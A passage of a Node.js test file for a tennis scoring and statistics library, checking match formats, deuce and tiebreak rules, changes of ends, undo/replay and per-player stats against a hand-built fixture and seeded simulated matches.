/**
 * Self-check for src/tennis (scoring, stats, trends, xlsx/csv, sheet layout, the Apps Script
 * connector, and the "can be inlined into one script" rules). No network, no dependencies.
 *
 *   node --test scripts/check-tennis.mjs        (npm run test:tennis)
 *
 * Buffer, node:zlib and node:vm are used in THIS file only, to check the library against
 * independent implementations. The library itself never touches them.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import { readFileSync, readdirSync, writeFileSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { crc32 } from 'node:zlib';

// src/tennis has no package.json "type", so node reparses it as ESM and warns once per file.
const printWarning = process.listeners('warning');
process.removeAllListeners('warning');
process.on('warning', (w) => {
  if (w.code !== 'MODULE_TYPELESS_PACKAGE_JSON') printWarning.forEach((l) => l(w));
});

const T = await import('../src/tennis/index.js');
const SRC = new URL('../src/tennis/', import.meta.url);
const ROOT = new URL('../', import.meta.url);
const FMT = Object.fromEntries(T.FORMATS.map((f) => [f.id, f.format]));

// ======================================================================================
// helpers
// ======================================================================================

/** Wins one whole game from 0-0 (four straight points win in ad and no-ad scoring alike). */
const gameTo = (ms, w) => {
  let r;
  for (let i = 0; i < 4; i++) r = ms.pointWon(w);
  return r;
};
/** Plays one game per entry (the winner); returns endsChange of each game's last point. */
const games = (ms, ws) => ws.map((w) => gameTo(ms, w).endsChange);
const S1 = [0, 1, 0, 1, 0, 1, 0, 1, 0, 0]; // a set won 6-4 by player 0 (10 games)
const S1_MIRROR = S1.map((w) => 1 - w); // 6-4 for player 1

/** Everything observable about a MatchScore, for exact comparisons. */
const sig = (ms) =>
  JSON.stringify([
    ms.server, ms.receiver, ms.side, ms.inTiebreak, ms.inMatchTiebreak, ms.sets, ms.points, ms.setsWon,
    ms.setNumber, ms.gameNumber, ms.matchWinner, ms.near, ms.pointLabel(), ms.setsLabel(), ms.situation(),
    ms.snapshot(), ms.history,
  ]);

function rng(seed) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

/** A whole match of coin-flip points with coherent PointRecords. Returns { points, ms }. */
function simulate(format, seed, withShots) {
  const rand = rng(seed);
  const first = rand() < 0.5 ? 0 : 1;
  const near0 = rand() < 0.5 ? 0 : 1;
  const ms = new T.MatchScore(format, first, near0);
  const points = [];
  const pick = (a) => a[Math.floor(rand() * a.length)];
  while (ms.matchWinner === null && points.length < 1500) {
    const snap = ms.snapshot();
    const winner = rand() < 0.5 ? 0 : 1;
    const server = snap.server;
    const serve1In = rand() < 0.62;
    const sv = winner === server;
    let outcome;
    if (sv) outcome = pick(['ace', 'serviceWinner', 'winner', 'winner', 'ue', 'fe']);
    else outcome = !serve1In && rand() < 0.2 ? 'df' : pick(['winner', 'winner', 'ue', 'fe']);
    if (outcome === 'ace') outcome = serve1In ? 'ace' : 'winner';
    const endedBy = { ace: server, serviceWinner: server, df: server }[outcome] ?? (outcome === 'winner' ? winner : 1 - winner);
    const rally = { ace: 1, serviceWinner: 2, df: 0 }[outcome] ?? 2 + Math.floor(rand() * 14);
    const serveNo = serve1In ? 1 : 2;
    const p = {
      ...snap,
      n: points.length + 1,
      serve1In,
      serveNo,
      serve1Speed: 70 + Math.floor(rand() * 40),
      serve2Speed: serve1In ? null : 60 + Math.floor(rand() * 30),
      placement: pick(['Wide', 'Body', 'T']),
      outcome,
      winner,
      endedBy,
      wing: outcome === 'winner' || outcome === 'ue' || outcome === 'fe' ? pick(['FH', 'BH']) : null,
      finalKind: outcome === 'ace' || outcome === 'serviceWinner' ? 'serve' : 'ground',
      rally,
      netApproach: rand() < 0.15 ? pick([0, 1]) : null,
      durSec: 4 + Math.floor(rand() * 20),
      at: 1760000000000 + points.length * 30000,
      src: pick(['auto', 'manual', 'confirmed']),
      note: rand() < 0.03 ? 'let cord' : null,
    };
    if (withShots && rally > 1) {
      p.shots = [{ i: 0, who: server, kind: 'serve', speed: p.serve1Speed, form: { trophyKnee: 100 + Math.floor(rand() * 40) } }];
      for (let i = 1; i < Math.min(rally, 5); i++) {
        p.shots.push({
          i, who: i % 2 ? 1 - server : server, kind: i === 1 ? 'return' : 'ground', wing: pick(['FH', 'BH']),
          speed: 40 + Math.floor(rand() * 50), spin: Math.floor(rand() * 3000) - 500, swing: 40 + Math.floor(rand() * 40),
          depth: pick(['deep', 'mid', 'short', 'out', 'net']), dir: pick(['CC', 'MID', 'DTL']),
          bounce: { x: rand() * 8 - 4, y: rand() * 24 }, netClear: rand(),
          form: { kneeMin: 110 + Math.floor(rand() * 60), stance: 1 + rand(), sep: Math.floor(rand() * 40), splitStep: rand() < 0.6 },
        });
      }
    }
    points.push(p);
    ms.pointWon(winner);
  }
  return { points, ms, near0 };
}

/** A PointRecord with sensible defaults, for hand-built fixtures. */
function pt(n, o = {}) {
  return {
    n, set: 1, game: 1, tb: false, scoreBefore: '0-0', gamesBefore: [0, 0], setsBefore: [0, 0], server: 0, side: 'deuce',
    serve1In: true, serveNo: 1, outcome: 'winner', winner: 0, endedBy: 0, rally: 4, breakPoint: false, pressure: false,
    at: 1760000000000 + n * 1000, src: 'manual', ...o,
  };
}

// ======================================================================================
// formats and scoring
// ======================================================================================

test('FORMATS: the five presets', () => {
  assert.deepEqual(T.FORMATS.map((f) => f.id), ['college', 'collegeShort', 'standard', 'doubles', 'pro8', 'fast4']);
  assert.deepEqual(FMT.college, { bestOf: 3, games: 6, noAd: true, tiebreakAt: 6, tbPoints: 7, finalSetMTB: false, mtbPoints: 10 });
  assert.deepEqual(FMT.collegeShort, { bestOf: 3, games: 6, noAd: true, tiebreakAt: 6, tbPoints: 7, finalSetMTB: true, mtbPoints: 10 });
  assert.equal(T.FORMATS[0].label, 'College singles');
  assert.equal(T.FORMATS[0].hint, 'ITA dual format: no-ad, tiebreak at 6-6, full third set');
  assert.deepEqual(FMT.standard, { bestOf: 3, games: 6, noAd: false, tiebreakAt: 6, tbPoints: 7, finalSetMTB: false, mtbPoints: 10 });
  assert.deepEqual(FMT.doubles, { bestOf: 1, games: 6, noAd: true, tiebreakAt: 6, tbPoints: 7, finalSetMTB: false, mtbPoints: 10 });
  assert.deepEqual(FMT.pro8, { bestOf: 1, games: 8, noAd: true, tiebreakAt: 8, tbPoints: 7, finalSetMTB: false, mtbPoints: 10 });
  assert.deepEqual(FMT.fast4, { bestOf: 3, games: 4, noAd: true, tiebreakAt: 3, tbPoints: 5, finalSetMTB: true, mtbPoints: 10 });
  for (const f of T.FORMATS) assert.ok(f.label && f.hint, f.id);
});

test('ad scoring: points, deuce, advantage, sides, break and game point', () => {
  const ms = new T.MatchScore(FMT.standard, 0, 0);
  assert.equal(ms.pointLabel(), '0-0');
  assert.equal(ms.server, 0);
  assert.equal(ms.receiver, 1);
  assert.equal(ms.side, 'deuce');
  const labels = [];
  const sides = [];
  for (const w of [0, 0, 0, 1, 1, 1]) {
    const r = ms.pointWon(w);
    assert.deepEqual(r, { gameWon: null, setWon: null, matchWon: null, endsChange: false });
    labels.push(ms.pointLabel());
    sides.push(ms.side);
  }
  assert.deepEqual(labels, ['15-0', '30-0', '40-0', '40-15', '40-30', 'Deuce']);
  assert.deepEqual(sides, ['ad', 'deuce', 'ad', 'deuce', 'ad', 'deuce']);
  assert.deepEqual(ms.situation(), { breakPoint: false, gamePoint: false, setPoint: false, matchPoint: false, pressure: true });

  ms.pointWon(1); // receiver has the advantage: server-first label is 40-AD
  assert.equal(ms.pointLabel(), '40-AD');
  assert.equal(ms.side, 'ad');
  assert.equal(ms.situation().breakPoint, true);
  assert.equal(ms.situation().gamePoint, false);
  ms.pointWon(0);
  assert.equal(ms.pointLabel(), 'Deuce');
  ms.pointWon(0);
  assert.equal(ms.pointLabel(), 'AD-40');
  assert.equal(ms.situation().gamePoint, true);
  assert.equal(ms.situation().breakPoint, false);
  ms.pointWon(1);
  assert.equal(ms.pointLabel(), 'Deuce');
  ms.pointWon(0);
  const r = ms.pointWon(0);
  assert.deepEqual(r, { gameWon: 0, setWon: null, matchWon: null, endsChange: true });
  assert.deepEqual(ms.sets, [[1, 0]]);
  assert.equal(ms.server, 1);
  assert.equal(ms.near, 1, 'the near player changes ends after game 1');
  assert.equal(ms.pointLabel(), '0-0');
  assert.deepEqual(ms.history, [0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0]);
});

test('no-ad: 40-40 is a single deciding point, recorded on the deuce side', () => {
  const ms = new T.MatchScore(FMT.college, 0, 0);
  for (const w of [0, 1, 0, 1, 0, 1]) ms.pointWon(w);
  assert.equal(ms.pointLabel(), '40-40');
  assert.equal(ms.side, 'deuce');
  assert.deepEqual(ms.situation(), { breakPoint: true, gamePoint: true, setPoint: false, matchPoint: false, pressure: true });
  const r = ms.pointWon(1);
  assert.deepEqual(r, { gameWon: 1, setWon: null, matchWon: null, endsChange: true });
  assert.deepEqual(ms.sets, [[0, 1]]);
  assert.equal(ms.server, 1);
  // and the server wins the deciding point
  const m2 = new T.MatchScore(FMT.college, 1, 0);
  for (const w of [1, 0, 1, 0, 1, 0]) m2.pointWon(w);
  assert.equal(m2.pointWon(1).gameWon, 1);
});

test('set tiebreak at 6-6: server rotation, sides, ends and who serves after', () => {
  const ms = new T.MatchScore(FMT.college, 0, 0);
  games(ms, [0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1]); // 6-6
  assert.equal(ms.inTiebreak, true);
  assert.equal(ms.inMatchTiebreak, false);
  assert.deepEqual(ms.sets, [[6, 6]]);
  assert.equal(ms.gameNumber, 13);
  assert.equal(ms.near, 0, 'six games, six changes: back where we started');
  assert.deepEqual(ms.snapshot(), {
    set: 1, game: 13, tb: true, scoreBefore: '0-0', gamesBefore: [6, 6], setsBefore: [0, 0], server: 0, side: 'deuce',
    breakPoint: false, gamePoint: false, setPoint: false, matchPoint: false, pressure: true,
  });

  const servers = [];
  const sides = [];
  const nears = [];
  const changes = [];
  for (let i = 0; i < 12; i++) {
    servers.push(ms.server);
    sides.push(ms.side);
    nears.push(ms.near);
    changes.push(ms.pointWon(i % 2).endsChange);
  }
  assert.deepEqual(servers, [0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0], 'serve changes every two points');
  assert.deepEqual(sides, ['deuce', 'ad', 'deuce', 'ad', 'deuce', 'ad', 'deuce', 'ad', 'deuce', 'ad', 'deuce', 'ad']);
  assert.deepEqual(nears, [0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1], 'ends change after 6 tiebreak points');
  assert.deepEqual(changes, [false, false, false, false, false, true, false, false, false, false, false, true]);
  assert.equal(ms.pointLabel(), '6-6');
  assert.equal(ms.situation().breakPoint, false);

  assert.equal(ms.pointWon(0).gameWon, null); // 7-6 is not enough, win by two
  assert.equal(ms.situation().setPoint, true);
  assert.equal(ms.server, 1, 'player 0 leads and is the receiver now');
  assert.equal(ms.situation().gamePoint, false);
  assert.equal(ms.situation().breakPoint, false, 'there are no break points in a tiebreak');
  const r = ms.pointWon(0); // 8-6
  assert.deepEqual(r, { gameWon: 0, setWon: 0, matchWon: null, endsChange: true });
  assert.deepEqual(ms.sets, [[7, 6], [0, 0]]);
  assert.deepEqual(ms.setsWon, [1, 0]);
  assert.equal(ms.setsLabel(), '7-6 0-0');
  assert.equal(ms.server, 1, 'the player who received the first tiebreak point serves next');
  assert.equal(ms.near, 1, 'the tiebreak counts as one game: 13 is odd, so the ends change');
  assert.equal(ms.inTiebreak, false);
  assert.deepEqual(ms.snapshot().gamesBefore, [0, 0]);
  assert.equal(ms.snapshot().set, 2);

  // the tiebreak starts with the player due to serve; with player 1 serving game 13 player 0 serves after it
  const m1 = new T.MatchScore(FMT.standard, 1, 0);
  games(m1, [0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1]);
  assert.equal(m1.server, 1);
  for (let i = 0; i < 7; i++) m1.pointWon(1);
  assert.equal(m1.setsWon[1], 1);
  assert.equal(m1.server, 0);
});

test('ends change after odd games of each set, counted afresh every set (ITF Rule 10)', () => {
  const ms = new T.MatchScore(FMT.standard, 0, 0);
  assert.deepEqual(games(ms, S1), [true, false, true, false, true, false, true, false, true, false]);
  assert.deepEqual(ms.sets, [[6, 4], [0, 0]]);
  assert.equal(ms.near, 1);
  assert.deepEqual(games(ms, [1, 1]), [true, false], 'game 11 (game 1 of set 2) is odd');
  assert.equal(ms.near, 0);

  // after a set with an ODD number of games they change at the set break (game 9) AND
  // again after game 1 of the next set, because the count restarts every set
  const m2 = new T.MatchScore(FMT.standard, 0, 1);
  assert.deepEqual(games(m2, [0, 1, 0, 1, 0, 1, 0, 0, 0]), [true, false, true, false, true, false, true, false, true]);
  assert.deepEqual(m2.sets, [[6, 3], [0, 0]]);
  assert.deepEqual(games(m2, [0, 0]), [true, false], 'game 1 of set 2 is odd again');

  // a point inside a game never changes ends
  const m3 = new T.MatchScore(FMT.standard, 0, 0);
  for (const w of [0, 0, 0, 1, 1, 1, 1, 0]) assert.equal(m3.pointWon(w).endsChange, false);
});

test('match tiebreak replaces the third set: 6-4 4-6 [10-8]', () => {
  const ms = new T.MatchScore(FMT.collegeShort, 0, 0);
  games(ms, S1);
  assert.equal(ms.inMatchTiebreak, false);
  games(ms, S1_MIRROR);
  assert.equal(ms.inMatchTiebreak, true);
  assert.equal(ms.inTiebreak, true);
  assert.deepEqual(ms.setsWon, [1, 1]);
  assert.equal(ms.setNumber, 3);
  assert.equal(ms.setsLabel(), '6-4 4-6 [0-0]');
  assert.deepEqual(ms.snapshot(), {
    set: 3, game: 1, tb: true, scoreBefore: '0-0', gamesBefore: [0, 0], setsBefore: [1, 1], server: 0, side: 'deuce',
    breakPoint: false, gamePoint: false, setPoint: false, matchPoint: false, pressure: true,
  });

  const servers = [];
  const changes = [];
  for (let i = 0; i < 16; i++) {
    servers.push(ms.server);
    changes.push(ms.pointWon(i % 2).endsChange);
  }
  assert.deepEqual(servers, [0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0]);
  assert.deepEqual(changes.map((c, i) => c && i + 1), [false, false, false, false, false, 6, false, false, false, false, false, 12, false, false, false, false]);
  assert.equal(ms.setsLabel(), '6-4 4-6 [8-8]');
  assert.equal(ms.situation().matchPoint, false);
  assert.equal(ms.pointWon(0).matchWon, null);
  assert.equal(ms.setsLabel(), '6-4 4-6 [9-8]');
  assert.equal(ms.situation().matchPoint, true);
  assert.equal(ms.situation().setPoint, true);
  const last = ms.pointWon(0);
  assert.deepEqual(last, { gameWon: 0, setWon: 0, matchWon: 0, endsChange: false }, 'nobody changes ends after the last point');
  assert.equal(ms.setsLabel(), '6-4 4-6 [10-8]');
  assert.deepEqual(ms.sets, [[6, 4], [4, 6], [10, 8]]);
  assert.equal(ms.matchWinner, 0);
  assert.equal(ms.inMatchTiebreak, false);
  assert.deepEqual(ms.situation(), { breakPoint: false, gamePoint: false, setPoint: false, matchPoint: false, pressure: false });

  const n = ms.history.length;
  assert.deepEqual(ms.pointWon(1), { gameWon: null, setWon: null, matchWon: null, endsChange: false }, 'points after the match are ignored');
  assert.equal(ms.history.length, n);
  assert.equal(ms.setsLabel(), '6-4 4-6 [10-8]');

  // the third set is played out when the format has no match tiebreak
  const std = new T.MatchScore(FMT.standard, 0, 0);
  games(std, S1);
  games(std, S1_MIRROR);
  assert.equal(std.inMatchTiebreak, false);
  assert.equal(std.inTiebreak, false);
  assert.equal(std.setNumber, 3);
});

test('set point, match point, break point and pressure flags', () => {
  const ms = new T.MatchScore(FMT.standard, 0, 0);
  games(ms, [0, 1, 0, 1, 0, 1, 0, 0]); // 5-3 to player 0, player 0 serves game 9
  assert.equal(ms.server, 0);
  const seen = [];
  for (let i = 0; i < 3; i++) {
    ms.pointWon(0);
    seen.push(ms.situation());
  }
  assert.deepEqual(seen[2], { breakPoint: false, gamePoint: true, setPoint: true, matchPoint: false, pressure: false }, '40-0 at 5-3');
  assert.equal(seen[0].setPoint, false);
  ms.pointWon(0);
  assert.deepEqual(ms.setsWon, [1, 0]);

  // second set, 5-3 up and 40-0 on RETURN: break point, set point and match point at once
  games(ms, [0, 1, 0, 1, 0, 1, 0, 0]);
  assert.deepEqual(ms.sets, [[6, 3], [5, 3]]);
  assert.equal(ms.server, 1);
  for (let i = 0; i < 3; i++) ms.pointWon(0);
  assert.equal(ms.pointLabel(), '0-40');
  assert.deepEqual(ms.situation(), { breakPoint: true, gamePoint: false, setPoint: true, matchPoint: true, pressure: true });

  // break point and pressure inside a game
  const b = new T.MatchScore(FMT.standard, 0, 0);
  const flags = [];
  for (const w of [1, 1, 1]) {
    b.pointWon(w);
    flags.push([b.pointLabel(), b.situation().breakPoint, b.situation().pressure]);
  }
  assert.deepEqual(flags, [['0-15', false, false], ['0-30', false, false], ['0-40', true, true]]);
  const c = new T.MatchScore(FMT.standard, 0, 0);
  for (const w of [0, 1, 1, 0]) c.pointWon(w);
  assert.equal(c.pointLabel(), '30-30');
  assert.deepEqual(c.situation(), { breakPoint: false, gamePoint: false, setPoint: false, matchPoint: false, pressure: true });
  c.pointWon(0);
  assert.deepEqual(c.situation(), { breakPoint: false, gamePoint: true, setPoint: false, matchPoint: false, pressure: false }, '40-30');

  assert.throws(() => c.pointWon(2), RangeError);
});

test('pro set to 8, tiebreak at 8-8', () => {
  const alt = [0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1]; // 7-7
  const a = new T.MatchScore(FMT.pro8, 0, 0);
  games(a, alt);
  assert.deepEqual(a.sets, [[7, 7]]);
  gameTo(a, 0); // 8-7 is not a set
  assert.equal(a.matchWinner, null);
  assert.equal(a.situation().setPoint, false);
  gameTo(a, 1); // 8-8: tiebreak
  assert.equal(a.inTiebreak, true);
  assert.equal(a.gameNumber, 17);
  for (let i = 0; i < 7; i++) a.pointWon(0);
  assert.equal(a.matchWinner, 0);
  assert.equal(a.setsLabel(), '9-8');

  const b = new T.MatchScore(FMT.pro8, 0, 0);
  games(b, alt);
  gameTo(b, 1); // 7-8
  const r = gameTo(b, 1); // 7-9
  assert.deepEqual(r, { gameWon: 1, setWon: 1, matchWon: 1, endsChange: false });
  assert.equal(b.setsLabel(), '7-9');
});

test('Fast4: sets to 4, tiebreak at 3-3 to 5 points, match tiebreak third set', () => {
  const a = new T.MatchScore(FMT.fast4, 0, 0);
  games(a, [0, 0, 0, 0]);
  assert.deepEqual(a.setsWon, [1, 0]);
  assert.deepEqual(a.sets, [[4, 0], [0, 0]]);

  const b = new T.MatchScore(FMT.fast4, 0, 0);
  games(b, [0, 1, 0, 1, 0, 1]); // 3-3
  assert.equal(b.inTiebreak, true);
  for (let i = 0; i < 5; i++) b.pointWon(1);
  assert.deepEqual(b.sets, [[3, 4], [0, 0]]);
  games(b, [0, 0, 0, 0]);
  assert.equal(b.inMatchTiebreak, true, '1-1 in sets');
  assert.equal(b.setsLabel(), '3-4 4-0 [0-0]');
});

test('undo is exact, and replay equals playing', () => {
  for (const [id, format] of Object.entries(FMT)) {
    for (let seed = 1; seed <= 12; seed++) {
      const rand = rng(seed * 7919);
      const first = rand() < 0.5 ? 0 : 1;
      const near = rand() < 0.5 ? 0 : 1;
      const ms = new T.MatchScore(format, first, near);
      const sigs = [sig(ms)];
      const winners = [];
      while (ms.matchWinner === null && winners.length < 1200) {
        const w = rand() < 0.5 ? 0 : 1;
        ms.pointWon(w);
        winners.push(w);
        sigs.push(sig(ms));
      }
      assert.deepEqual(ms.history, winners, id);
      for (const k of [0, 1, 2, 5, 20, Math.floor(winners.length / 2), winners.length]) {
        assert.equal(sig(T.MatchScore.replay(format, first, winners.slice(0, k), near)), sigs[k], `${id} seed ${seed}: replay of ${k} points`);
      }
      for (let k = winners.length; k > 0; k--) {
        ms.undo();
        assert.equal(sig(ms), sigs[k - 1], `${id} seed ${seed}: undo back to ${k - 1} points`);
      }
      ms.undo(); // nothing left to undo
      assert.equal(sig(ms), sigs[0]);
    }
  }
});

// ======================================================================================
// stats
// ======================================================================================

/*
 * 13 points, college format. Player 0 serves games 1 and 3, player 1 serves game 2.
 *
 * n  game srv score  1stIn sn  1st 2nd  place  outcome        win by  wing rally net bp pr
 * 1  1    0   0-0    y     1   100 -    T      ace            0  0    -    1     -   -  -
 * 2  1    0   15-0   n     2   95  80   Body   winner         0  0    FH   6     0   -  -
 * 3  1    0   30-0   y     1   98  -    Wide   ue             1  0    BH   3     -   -  -
 * 4  1    0   30-15  y     1   90  -    T      winner         1  1    BH   9     -   -  -
 * 5  1    0   30-30  n     2   92  84   Wide   df             1  0    -    0     -   -  y
 * 6  1    0   30-40  y     1   96  -    Body   ue             1  0    FH   4     -   y  y   (game to 1: a break)
 * 7  2    1   0-0    y     1   105 -    T      serviceWinner  1  1    -    2     -   -  -
 * 8  2    1   15-0   y     1   101 -    T      fe             1  0    -    5     -   -  -
 * 9  2    1   30-0   y     1   99  -    Wide   winner         0  0    FH   7     1   -  -
 * 10 2    1   30-15  n     2   90  85   Body   winner         0  0    BH   3     -   -  -
 * 11 2    1   30-30  y     1   103 -    T      winner         0  0    FH   8     -   -  y
 * 12 2    1   30-40  y     1   97  -    Wide   ue             0  1    FH   4     -   y  y   (game to 0: a break)
 * 13 3    0   0-0    y     1   99  -    T      ace            0  0    -    1     -   -  -   (game 3 still going)
 */
const FIX = [
  pt(1, { serve1Speed: 100, placement: 'T', outcome: 'ace', rally: 1, shots: [{ i: 0, who: 0, kind: 'serve', speed: 100, form: { trophyKnee: 120 } }] }),
  pt(2, {
    scoreBefore: '15-0', side: 'ad', serve1In: false, serveNo: 2, serve1Speed: 95, serve2Speed: 80, placement: 'Body', wing: 'FH', rally: 6, netApproach: 0,
    shots: [
      { i: 0, who: 0, kind: 'serve', speed: 80 },
      { i: 1, who: 1, kind: 'return', wing: 'BH', speed: 60, spin: 1000, swing: 50, depth: 'deep', form: { kneeMin: 140, splitStep: true } },
      { i: 2, who: 0, kind: 'ground', wing: 'FH', speed: 70, spin: 2000, swing: 60, depth: 'mid', form: { kneeMin: 130, splitStep: false } },
      { i: 3, who: 1, kind: 'ground', wing: 'FH', speed: 65, spin: -500, swing: 55, depth: 'short', form: { kneeMin: 150, splitStep: true } },
    ],
  }),
  pt(3, { scoreBefore: '30-0', serve1Speed: 98, placement: 'Wide', outcome: 'ue', winner: 1, endedBy: 0, wing: 'BH', rally: 3 }),
  pt(4, { scoreBefore: '30-15', side: 'ad', serve1Speed: 90, placement: 'T', winner: 1, endedBy: 1, wing: 'BH', rally: 9 }),
  pt(5, { scoreBefore: '30-30', serve1In: false, serveNo: 2, serve1Speed: 92, serve2Speed: 84, placement: 'Wide', outcome: 'df', winner: 1, endedBy: 0, rally: 0, pressure: true }),
  pt(6, { scoreBefore: '30-40', side: 'ad', serve1Speed: 96, placement: 'Body', outcome: 'ue', winner: 1, endedBy: 0, wing: 'FH', rally: 4, breakPoint: true, pressure: true }),
  pt(7, { game: 2, gamesBefore: [0, 1], server: 1, serve1Speed: 105, placement: 'T', outcome: 'serviceWinner', winner: 1, endedBy: 1, rally: 2 }),
  pt(8, { game: 2, gamesBefore: [0, 1], server: 1, scoreBefore: '15-0', side: 'ad', serve1Speed: 101, placement: 'T', outcome: 'fe', winner: 1, endedBy: 0, rally: 5 }),
  pt(9, {
    game: 2, gamesBefore: [0, 1], server: 1, scoreBefore: '30-0', serve1Speed: 99, placement: 'Wide', wing: 'FH', rally: 7, netApproach: 1,
    shots: [{ i: 3, who: 0, kind: 'ground', wing: 'FH', speed: 80, spin: 3000, swing: 70, depth: 'deep', form: { kneeMin: 120, splitStep: true } }],
  }),
  pt(10, { game: 2, gamesBefore: [0, 1], server: 1, scoreBefore: '30-15', side: 'ad', serve1In: false, serveNo: 2, serve1Speed: 90, serve2Speed: 85, placement: 'Body', wing: 'BH', rally: 3 }),
  pt(11, { game: 2, gamesBefore: [0, 1], server: 1, scoreBefore: '30-30', serve1Speed: 103, placement: 'T', wing: 'FH', rally: 8, pressure: true }),
  pt(12, { game: 2, gamesBefore: [0, 1], server: 1, scoreBefore: '30-40', side: 'ad', serve1Speed: 97, placement: 'Wide', outcome: 'ue', winner: 0, endedBy: 1, wing: 'FH', rally: 4, breakPoint: true, pressure: true }),
  pt(13, { game: 3, gamesBefore: [1, 1], serve1Speed: 99, placement: 'T', outcome: 'ace', rally: 1 }),
];

test('computeStats on a hand-built 13-point fixture', () => {
  const st = T.computeStats(FIX);
  const [a, b] = st.players;
  const r = (won, of) => ({ won, of });
  assert.equal(st.pointsPlayed, 13);
  assert.deepEqual(st.momentum, [1, 2, 1, 0, -1, -2, -3, -4, -3, -2, -1, 0, 1]);
  assert.equal(st.avgRally, 4.4, '53 shots over the 12 points with a rally');

  assert.deepEqual([a.pointsWon, b.pointsWon], [7, 6]);
  assert.deepEqual([a.aces, a.dfs, b.aces, b.dfs], [2, 1, 0, 0]);
  assert.deepEqual(a.firstServeIn, r(5, 7));
  assert.deepEqual(b.firstServeIn, r(5, 6));
  assert.deepEqual(a.firstServeWon, r(2, 5));
  assert.deepEqual(b.firstServeWon, r(2, 5));
  assert.deepEqual(a.secondServeWon, r(1, 2), 'the double fault counts as lost');
  assert.deepEqual(b.secondServeWon, r(0, 1));
  assert.deepEqual(a.servicePoints, r(3, 7));
  assert.deepEqual(b.servicePoints, r(2, 6));
  assert.deepEqual(a.returnPoints, r(4, 6));
  assert.deepEqual(b.returnPoints, r(4, 7));
  assert.deepEqual(a.serviceGames, r(0, 1), 'game 3 is still going, so it is not counted');
  assert.deepEqual(b.serviceGames, r(0, 1));
  assert.deepEqual(a.breakPointsSaved, r(0, 1));
  assert.deepEqual(a.breakPointsWon, r(1, 1));
  assert.deepEqual(b.breakPointsSaved, r(0, 1));
  assert.deepEqual(b.breakPointsWon, r(1, 1));

  assert.deepEqual([a.winners, a.winnersFH, a.winnersBH], [4, 3, 1], 'aces and service winners are not rally winners');
  assert.deepEqual([b.winners, b.winnersFH, b.winnersBH], [1, 0, 1]);
  assert.deepEqual([a.ue, a.ueFH, a.ueBH, a.fe], [2, 1, 1, 1]);
  assert.deepEqual([b.ue, b.ueFH, b.ueBH, b.fe], [1, 1, 0, 0]);
  assert.deepEqual(a.netPoints, r(1, 1));
  assert.deepEqual(b.netPoints, r(0, 1));
  assert.deepEqual(a.rallyShort, r(4, 8));
  assert.deepEqual(b.rallyShort, r(4, 8));
  assert.deepEqual(a.rallyMid, r(3, 4));
  assert.deepEqual(b.rallyMid, r(1, 4));
  assert.deepEqual(a.rallyLong, r(0, 1));
  assert.deepEqual(b.rallyLong, r(1, 1));
  assert.deepEqual(a.pressurePoints, r(2, 4));
  assert.deepEqual(b.pressurePoints, r(2, 4));
  assert.deepEqual(a.afterOwnError, r(0, 2));
  assert.deepEqual(b.afterOwnError, r(0, 1));
  assert.deepEqual(a.firstPointOfGame, r(2, 3));
  assert.deepEqual(b.firstPointOfGame, r(1, 3));
  assert.deepEqual([a.longestRun, b.longestRun], [5, 6]);

  assert.deepEqual(a.serve1Speed, { avg: 95.7, max: 100 });
  assert.deepEqual(b.serve1Speed, { avg: 99.2, max: 105 });
  assert.deepEqual(a.serve2Speed, { avg: 82, max: 84 });
  assert.deepEqual(b.serve2Speed, { avg: 85, max: 85 });
  assert.deepEqual(a.placement, { deuce: { Wide: 2, Body: 0, T: 2 }, ad: { Wide: 0, Body: 2, T: 1 } });
  assert.deepEqual(b.placement, { deuce: { Wide: 1, Body: 0, T: 2 }, ad: { Wide: 1, Body: 1, T: 1 } });

  assert.deepEqual(a.shotSpeed, { avg: 75, max: 80 }, 'serves are not rally shots');
  assert.deepEqual(a.spin, { avg: 2500, max: 3000 });
  assert.deepEqual(a.swing, { avg: 65, max: 70 });
  assert.deepEqual(a.depth, { deep: 1, mid: 1, short: 0, out: 0, net: 0 });
  assert.deepEqual(a.kneeMin, { avg: 125 });
  assert.deepEqual(a.splitStepRate, r(1, 2));
  assert.deepEqual(b.shotSpeed, { avg: 62.5, max: 65 });
  assert.deepEqual(b.spin, { avg: 250, max: 1000 });
  assert.deepEqual(b.swing, { avg: 52.5, max: 55 });
  assert.deepEqual(b.depth, { deep: 1, mid: 0, short: 1, out: 0, net: 0 });
  assert.deepEqual(b.kneeMin, { avg: 145 });
  assert.deepEqual(b.splitStepRate, r(2, 2));
});

test('computeStats: empty input, ratios, and service games that end on the last point', () => {
  const e = T.computeStats([]);
  assert.equal(e.pointsPlayed, 0);
  assert.deepEqual(e.momentum, []);
  assert.equal(e.avgRally, null);
  assert.deepEqual(e.players[0].firstServeIn, { won: 0, of: 0 });
  assert.deepEqual(e.players[0].serve1Speed, { avg: null, max: null });
  assert.deepEqual(e.players[1].kneeMin, { avg: null });
  assert.equal(T.pct({ won: 0, of: 0 }), null);
  assert.equal(T.pct({ won: 7, of: 12 }), 58);
  assert.equal(T.pct({ won: 1, of: 3 }), 33);
  assert.equal(T.fmtRatio({ won: 7, of: 12 }), '7/12 (58%)');
  assert.equal(T.fmtRatio({ won: 0, of: 0 }), '-');
  assert.equal(T.fmtRatio({ won: 0, of: 4 }), '0/4 (0%)');

  // a whole simulated match: every game is counted, including the one that ended the match
  for (const [id, format] of Object.entries(FMT)) {
    for (let seed = 1; seed <= 30; seed++) {
      const { points, ms } = simulate(format, seed * 101, false);
      const st = T.computeStats(points);
      const counted = st.players[0].serviceGames.of + st.players[1].serviceGames.of;
      // regular games played = all games of every set, less a tiebreak game, less a match tiebreak
      const mtb = ms.setsLabel().includes('[');
      const expected = ms.sets
        .slice(0, mtb ? -1 : undefined)
